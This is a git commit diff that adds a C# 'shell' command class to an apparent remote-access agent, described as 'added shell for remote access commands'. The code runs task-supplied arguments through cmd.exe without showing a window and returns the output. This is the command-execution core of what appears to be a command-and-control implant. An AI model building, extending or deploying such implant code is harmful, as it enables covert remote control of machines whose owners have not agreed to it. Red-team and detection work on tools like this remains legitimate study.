73433044851a5b4f0c0034996efa0d4091aa575f
WG37 <willg2070@gmail.com>
2025-12-03 13:16:19 +1100

    feat(): added shell for remote access commands

---
+++ Agent/Application/Commands/Shell.cs
@@ -0,0 +1,42 @@
+﻿using AgentClient.Domain.Models.Agents;
+using System.Diagnostics;
+
+namespace AgentClient.Application.Commands
+{
+    public class Shell : AgentCommand
+    {
+        public override string Name => "shell";
+
+        public override string Execute(AgentTask task)
+        {
+            var stdout = "";
+
+            var args = string.Join(" ", task.Arguments);
+
+            var pStartInfo = new ProcessStartInfo
+            {
+                FileName = @"C:\Windows\System32\cmd.exe",
+                Arguments = $"/c {args}",
+                WorkingDirectory = Directory.GetCurrentDirectory(),
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            var process = Process.Start(pStartInfo);
+
+            using (process.StandardOutput)
+            {
+                stdout += process.StandardOutput.ReadToEnd();
+            }
+
+            using (process.StandardError)
+            {
+                stdout += process.StandardError.ReadToEnd();
+            }
+
+            return stdout;
+        }
+    }
+}
